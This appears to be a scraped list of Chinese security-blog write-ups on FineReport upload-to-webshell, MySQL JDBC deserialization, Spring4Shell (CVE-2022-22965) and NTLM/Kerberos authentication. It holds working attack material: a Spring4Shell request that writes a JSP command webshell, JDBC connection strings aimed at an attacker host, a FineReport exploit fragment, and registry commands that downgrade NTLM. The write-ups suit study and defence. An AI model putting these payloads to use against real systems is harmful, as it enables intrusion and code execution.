t/decision/remote/design/channel"headers={"Content-Type":"application/octet-stream"}data=""rep=requests.post(url,headers=headers,data=base64.b64decode(data),verify=False)print(rep.text)</li>
  <li>前言最近在项目中遇到了FineReport后台上传插件时数据包过大上传失败，但内部扫描器的POC却能检测到漏洞，所以找了很久旧版本安装包来分析一下代码。漏洞分析插件上传在com.fr.fs.plugin.op.web.action.InstallFromDiskAction#actionCMD在26行进行文件上传操作，WebHelper.DOWNLOAD_PATH值默认为”/cache”，跟进com.fr.fs.plugin.op.web.helper.UploadHelper#getFileFromFront，为获取文件内容后写入/cache/temp.zip。在InstallFromDiskAction中的actionCMD方法，文件上传成功后会自动进行插件安装，安装失败则抛出错误，但不会删除temp.zip文件。然后利用系统备份功能com.fr.fs.web.service.ServerConfigManualBackupAction#actionCMD，移动和重命名temp.zip。当optype参数为edit_backup时，接收oldname、newname两个参数，然后调用File类的renameTo方法将oldname进行移动及重命名为newname，此处的默认目录为frbak。漏洞利用之前遇到这个漏洞，都是在插件zip内放入webshell，部署插件进行备份，这种方法经常会遇到插件版本不匹配的问题，但数据包过大传不上去还是第一次。部署插件利用的是com.fr.fs.plugin.op.web.helper.WebHelper#installFromDisk的解压操作释放webshell，但其实不难看出实际不需要部署插件，只需要利用插件上传功能将我们的webshell落地到temp.zip后，进行后续的移动及重命名就可以了。思考以前遇到nday都是用公开的poc去打，这次也是机缘巧合才会去翻代码，想起P牛说过很少参照别⼈的文章来学习，确实也要有所改变了。</li>
  <li>前言BlackHatEurope2019《NewExploitTechniqueInJavaDeserializationAttack》议题学习。JavaDataBaseConnectivityJDBC（JavaDatabaseConnectivity）是Java程序访问数据库的标准接口。使用Java程序访问数据库时，Java代码并不是直接通过TCP连接去访问数据库，而是通过JDBC接口来访问，而JDBC接口则通过JDBC驱动来实现真正对数据库的访问。publicstaticvoidmain(String[]args)throwsException{StringDB_URL="jdbc:mysql://127.0.0.1:3306/sectest?var=value";Driverdriver=newcom.mysql.jdbc.Driver();Connectionconn=driver.connect(DB_URL,props);Statementstmt=conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,....);}JDBC通常使用不同的URL/URI连接字符串来与指定类型的数据库建立连接，这个URL主要包含三个部分:驱动名称、连接地址以及扩展参数。漏洞环境https://github.com/fuzz7j/JavaSecuritySourceCode/MySQL_JDBC_Deserialization漏洞分析根据PPT看到入口点为com.mysql.cj.jdbc.result.ResultSetImpl#getObjectpublicObjectgetObject(intcolumnIndex)throwsSQLException{...caseBLOB://autoDeserialize为开启状态则继续if((Boolean)this.connection.getPropertySet().getBooleanProperty("autoDeserialize").getValue()){Objectobj=data;try{ByteArrayInputStreambytesIn=newByteArrayInputStream(data);ObjectInputStreamobjIn=newObjectInputStream(bytesIn);obj=objIn.readObject();objIn.close();bytesIn.close();}}}当MySQL字段类型为BLOB时，会触发readObject进行反序列化。ServerStatusDiffInterceptor触发方式作者利用扩展参数queryInterceptors来触发getObject方法。queryInterceptors:实现com.mysql.cj.interceptors.QueryInterceptor的类的逗号分隔列表，应放置在查询执行“中间”以影响结果。在com.mysql.cj.interceptors.QueryInterceptor的实现类中，com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor会调用getObject方法。populateMapWithSessionStatusValues执行一次SHOWSESSIONSTATUS查询，并调用ResultSetUtil.resultSetToMap(toPopulate,rs)处理结果。resultSetToMap调用了getObject方法，构成一条利用链。detectCustomCollations触发方式扩展参数detectCustomCollations是从5.1.29开始支持的，在5.1.29之前，此选项默认为True。触发点为com.mysql.jdbc.ConnectionImpl#buildCollationMapping。privatevoidbuildCollationMapping()throwsSQLException{...//服务器版本大于等于4.1.0且detectCustomCollations为Trueif(this.versionMeetsMinimum(4,1,0)&amp;&amp;this.getDetectCustomCollations()){java.sql.Statementstmt=null;ResultSetresults=null;try{results=stmt.executeQuery("SHOWCOLLATION");//服务器版本大于等于5.0.0f(this.versionMeetsMinimum(5,0,0)){Util.resultSetToMap(sortedCollationMap,results,3,2);}}}}可用连接串ServerStatusDiffInterceptor触发方式8.xjdbc:mysql://attacker/db?queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true6.xjdbc:mysql://attacker/db?statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true5.1.x（5.1.11及以上）jdbc:mysql://attacker/db?statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true5.1.x（5.1.10及以下）连接时的SQL查询是在createNewIO方法中触发，但5.1.10及以前版本，Interceptors的初始化在createNewIO之后，导致查询触发前还不存在Interceptors，故无法通过连接直接触发。5.0.x不可用detectCustomCollations触发方式5.1.x（5.1.41及以上）不可用5.1.29-5.1.40jdbc:mysql://attacker/db?detectCustomCollations=true&amp;autoDeserialize=true5.1.28-5.1.19jdbc:mysql://attacker/db?autoDeserialize=true5.1.x（5.1.18及以下）不可用5.0.x版本不可用参考链接https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdfhttps://www.anquanke.com/post/id/203086https://paper.seebug.org/1832/</li>
  <li>前言此漏洞源于云舒的一条微博，不过其实并没有达到“核弹级”，顶多是个手榴弹。因为之前没有接触过Autobinding漏洞，正好学习一下，SpringMVC自动绑定漏洞参考这篇文章：浅析自动绑定漏洞之SpringMVCCVE-2010-1622CVE-2022-22965是CVE-2010-1622的绕过，CVE-2010-1622漏洞发布者原博，所以本篇文章会从CVE-2010-1622开始学习。测试代码创建一个JavaBean对象publicclassUser{privateStringusername;publicStringgetUsername(){System.out.println("[+]调用了com.fuzz7j.controller.getUsername");returnusername;}publicvoidsetUsername(Stringusername){System.out.println("[+]调用了com.fuzz7j.controller.setUsername");this.username=username;}}绑定User到HelloController@RestControllerpublicclassHelloController{@RequestMapping("/")publicStringindex(Useruser){System.out.println(user.getUsername());return"success";}}漏洞分析JavaBeansAPIjava.beans.Introspector提供了两种getBeanInfo()方法。BeanInfogetBeanInfo(ClassbeanClass)BeanInfogetBeanInfo(ClassbeanClass,ClassstopClass)当没有提供stopClass时，BeanInfo的PropertyDescriptor数组会包含class属性，class属性对应Object.getClass()方法。如下输出为User.class属性：Property:classProperty:username我们可以进一步枚举Class.class属性：BeanInfobean=Introspector.getBeanInfo(Class.class);PropertyDescriptor[]properties=bean.getPropertyDescriptors();for(PropertyDescriptorpd:properties){System.out.println("Property:"+pd.getName());}Property:annotatedInterfacesProperty:annotatedSuperclassProperty:annotationProperty:annotationsProperty:anonymousClassProperty:arrayProperty:canonicalNameProperty:classProperty:classLoaderProperty:classesProperty:componentTypeProperty:constructorsProperty:declaredAnnotationsProperty:declaredClassesProperty:declaredConstructorsProperty:declaredFieldsProperty:declaredMethodsProperty:declaringClassProperty:enclosingClassProperty:enclosingConstructorProperty:enclosingMethodProperty:enumProperty:enumConstantsProperty:fieldsProperty:genericInterfacesProperty:genericSuperclassProperty:interfaceProperty:interfacesProperty:localClassProperty:memberClassProperty:methodsProperty:modifiersProperty:moduleProperty:nameProperty:nestHostProperty:nestMembersProperty:packageProperty:packageNameProperty:primitiveProperty:protectionDomainProperty:signersProperty:simpleNameProperty:superclassProperty:syntheticProperty:typeNameProperty:typeParametersSpringBeansSpringMVC可以让开发者定义一个JavaBean对象，实现getter和setter方法，之后绑定到表单中，以方便开发人员使用。当我们提交http://localhost:8080/?username=testHelloController会自动把username=test变成对象User.username的值。这里是因为SpringMVC的自动映射功能，会自动发现User对象的public方法和字段，如果出现public的字段，就自动绑定，并且允许通过用户提交请求进行赋值。但当JavaBean对象没有public字段且没有setter方法时，则不允许赋值。为了支持更复杂的类，Spring还支持”点表示法”。比如：user.username.lastname=test，等于：frmObj.getUser().getUserName().setLastName("test")但SpringBeans的CachedIntrospectionResults类在获取Bean属性时，没有指定stopClass，意味着class属性和后面的属性都可以通过HTTP请求设置。比如通过下面请求修改ClassLoader的值。http://localhost:8080/?class.ClassLoader=漏洞利用当SpringMVC在Tomcat运行时，会有一个WebappClassLoader来加载/WEB-INF/classes和/WEB-INF/lib下的类。org.apache.catalina.loader.WebappClassLoader一旦这个类中，出现了可以set的字段，用户就可以提交请求，改变其中的值。比如https://www.inbreak.net/archives/377中提到的修改delegate属性造成DOS攻击。http://localhost:8080/?class.classLoader.delegate=false此漏洞具体利用方式可参考原作者文章。修复方案这里因为Spring官方修复方案是将‘classLoader’和‘protectionDomain’加入黑名单，禁止任何class对象获取，这也是CVE-2022-22965只在jdk9+下才受影响的原因。CVE-2022-22965Exp分析POST/HTTP/1.1Host:127.0.0.1:8080Content-Type:application/x-www-form-urlencodedtest:%Content-Length:503class.module.classLoader.resources.context.parent.pipeline.first.pattern=%3c%25%7btest%7diRuntime.getRuntime().exec(request.getParameter(%22cmd%22))%3b%25%7btest%7di%3e%3c!--&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=/app/webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=test&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=00000这里是利用Tomcat的classLoader修改org.apache.catalina.valves.AccessLogValue的属性，字段信息：具体利用方式为修改fileDateFormat导致Tomcat切换日志，修改默认后缀，修改日志存放目录，修改日志格式写Webshell。添加test:%原因为写入文件不能存在%，使用占位符替换，来自https://www.t00ls.cc/viewthread.php?tid=65239bypass原因jdk9开始多了一个模块化的新特性，这里的classLoader不是class获取，而是通过model对象获取的，所以绕过了CVE-2010-1622的补丁。无损检测参考https://xz.aliyun.com/t/11129#toc-8遍历嵌套属性。发现存在DefaultAssertionStatus属性，作用为设置此类加载器的默认断言状态，参数为boolean型，默认为false。可以通过如下POC进行测试：http://localhost:8080/?class.module.classLoader.DefaultAssertionStatus=falsehttp://localhost:8080/?class.module.classLoader.DefaultAssertionStatus=666当目标存在漏洞时，class.module.classLoader.DefaultAssertionStatus=false返回正常页面。而class.module.classLoader.DefaultAssertionStatus=666因为参数不符合，返回400页面。修复方案https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15参考链接http://blog.o0o.nu/2010/06/cve-2010-1622.htmlhttps://www.inbreak.net/archives/377https://www.t00ls.cc/viewthread.php?tid=65239https://xz.aliyun.com/t/11143https://xz.aliyun.com/t/11129</li>
  <li>Kerberos协议非常复杂，学习时每篇文章都有不同之处，本篇文章查询了MSDN，尽量保证准确性，后续学习过程中如果发现内容有误会及时更正。认证协议LMLANManagerChallenge/Response验证机制，简称LM。该方案比NTLM响应时间更早，安全性更低。认证流程：A向B发起请求。B返回一个8字节的响应码。A将自己的LMHash分成三部分，每组7字节，每组都使用响应码对其进行加密，然后发送给B。然后B也执行和A相同的操作，不过LMHash是储存在服务器中A的LMHash。两个LM-Hash进行比较，一致即认证成功。NTLMNTLM身份验证采用Challenge/Response机制，由协商、质询、身份验证三步组成。域环境认证流程：用户访问客户端计算机并提供域名、用户名和密码。客户端计算密码的加密哈希并丢弃实际密码。客户端将用户名以明文形式发送到服务器。服务器判断用户名是否存在，存在则生成一个16字节的随机数，称为Challenge或Nonce，并返回给客户端。客户端使用用户密码的Hash对服务器返回的随机数进行加密，并将结果返回给服务器，被称为Response。服务器向域控发送以下三项信息：用户名发送给客户端的Challenge从客户端收到的Response域控使用用户名从安全账户管理器数据库中检索用户密码的Hash，并使用此Hash加密Challenge。域控将加密后的Challenge与客户端计算出的Response进行比较，如果相同则认证成功。Net-NTLMv1服务器返回8位Challenge，Response加密算法3DES。Net-NTLMv2从WindowsVista起，默认使用Net-NTLMv2协议。服务器返回16位Challenge，Response加密算法HMAC-MD5。KerberosKerberos协议构成：客户端、服务器、KDC（KeyDistributionCenter密钥分发中心）相关信息角色作用KeyDistributedCentser密钥分发中心，包含AS和TGS两个服务AuthenticationService身份验证服务，用于KDC对Client认证生成TGTTicketGrantingTicket票据授予票据，用于向KDC获取服务票据的凭证TicketGrantingService票据授予服务，用于KDC为Client生成STActiveDirectory活动目录，用于存储用户、用户组、域相关的信息ServerTicket服务票据，也被称为TGSTicket，用于访问服务的凭证ApplicationServer应用服务器，提供用户所需服务krbtgt密钥发行中心服务帐户，不可登陆，发放票据时会使用它的NTLMHash认证流程AS_REQ当域内某个客户端试图访问域内的某个服务，输入用户名密码后，客户端会向AS发送AS_REQ（身份验证服务请求）：用户名、请求的服务请求凭据（使用用户密码Hash加密的时间戳）AS_REPKDC检查用户是否在本地数据库，存在则使用存储在本地的NTLMHash解密凭据验证用户身份，如验证通过且时间戳在有效期内（5分钟），则返回AS_REP（身份验证服务回复）：用户名TGT：用户名、会话密钥、TGT有效期、具有用户权限的PAC，使用krbtgt账户NTLMHash加密Session-Key:使用用户的NTLMHash加密此时，用户拥有TGT，可用于请求TGS，然后访问服务。TGS_REQ客户端收到消息后，使用自己的NTLMHash解密AS_REP返回的TGT，得到会话密钥。然后向TGS发送请求TGS_REQ（票据授予服务请求）：TGT请求服务的SPNAuthenticator：使用会话密钥加密的用户名、时间戳等信息TGS_REPTGS收到TGS_REQ后，先在KDC中查找服务的SPN是否存在，如存在使用自己的TGS密钥解密TGS_REQ发送的TGT，得到会话密钥。使用会话密钥解密TGS_REQ中的Authenticator，验证通过后向客户端发送TGS_REP（票据授予服务回复）：用户名ST（ServerTicket）：用户名、服务会话密钥、票据有效期等信息，使用请求服务的NTLMHash加密使用会话密钥加密的服务会话密钥AP_REQ客户端使用会话密钥解密TGS，得到服务会话密钥，将ST票据和服务会话密钥缓存到本地。当客户端需要访问某个服务端上的服务时，会向服务端发送AP_REQ（应用程序请求）。Authenticator：使用服务会话密钥加密的时间戳等信息STAP_REP（可选）服务端使用自己的NTLMHash解密ST，获取服务会话密钥、授权用户信息。服务端使用服务会话密钥解密Authenticator等信息，与ST对比，通过验证后与客户端进行双向验证（此过程需要开启PAC验证服务，没有配置PAC可能会导致白银票据攻击）：双向验证过程：1.服务端验证客户端：i.服务端发送PAC询问KDC用户有无访问权限。ii.KDC解密PAC通过SID判断用户组信息、权限等返回给服务端。iii.Server收到信息并与请求服务的ACL进行比较，决定是否提供服务。2.客户端验证服务端：i.服务端发送Authenticator（使用服务会话密钥的时间戳）给客户端。ii.客户端解密成功则证明验证服务会话密钥一致，双向验证通过。iii.服务端开放服务，客户端访问服务。加密方式Windows只保存密码Hash值。格式：Username:RID:LM-Hash:NTLM-Hash（LM-Hash从WindowsVista开始为空）工作组环境用户信息保存在%SystemRoot%\System32\config\SAM域环境用户信息保存在域控C:\Windows\NTDS\NTDS.ditLMHashLMHash从WindowsVista开始默认禁用。启用方式：本地安全策略=&gt;本地策略=&gt;安全选项，将不储存LAN管理器哈希值改为禁用。加密过程：用户的密码转换为大写，密码转换为16进制字符串，不足14字节将会用0来再后面补全。密码的16进制字符串被分成两个7byte部分。每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度。再分7bit为一组，每组末尾加0，再组成一组。上步骤得到的二组，分别作为key为KGS!@#$%进行DES加密。将加密后的两组拼接在一起，得到最终LMHash值。缺点：口令不区分大小写。口令长度最多为14字节，超过14字节使用NTLMHash。如果没有超过7字节后面8字节是固定的（aad3b435b51404ee）。DES加密key固定（KGS!@#$%）。NTLMHashNTLMHash是支持NetNTLM认证协议及本地认证过程中的一个重要参与物，其长度为32位，由数字与字母组成。可以从Windows系统中的SAM文件和域控的NTDS.dit文件中获得所有用户的Hash，通过Mimikatz读取lsass.exe进程能获得已登录用户的NTLMHsash。加密过程：将用户密码转换为十六进制格式。将十六进制格式的密码进行Unicode编码。使用MD4摘要算法对Unicode编码数据进行Hash计算。Net-NTLMHash指网络环境下的NTLM认证中的Hash，NTLM认证中的Response包含Net-NTLMHash。在NTLM协议中，NTLM响应分为NTLMv1，NTLMv2，NTLMsessionv2三种协议，不同协议使用不同格式的Challenge和加密算法。Net-NTLMv1Hash格式：username::hostname:LMresponse:NTLMresponse:challenge修改注册表启用：regaddHKLM\SYSTEM\CurrentControlSet\Control\Lsa\/vlmcompatibilitylevel/tREG_DWORD/d2/fregaddHKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\/vNtlmMinClientSec/tREG_DWORD/d536870912/fregaddHKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\/vRestrictSendingNTLMTraffic/tREG_DWORD/d0/8位Challenge，Response加密算法3DES。这种方式相对脆弱，可以基于抓包工具和彩虹表爆破工具进行破解。Net-NTLMv2Hash格式：username::domain:challenge:HMAC-MD5:blob16位Challenge，Response加密算法HMAC-MD5。参考链接https://xz.aliyun.com/t/8187https://xz.aliyun.com/t/10491https://www.t00ls.cc/thread-63319-1-1.htmlhttps://websec.readthedocs.io/zh/latest/auth/index.htmlhttps://docs.microsoft.com/zh-cn/archive/blogs/apgceps/packerberos-2</li>
</ul>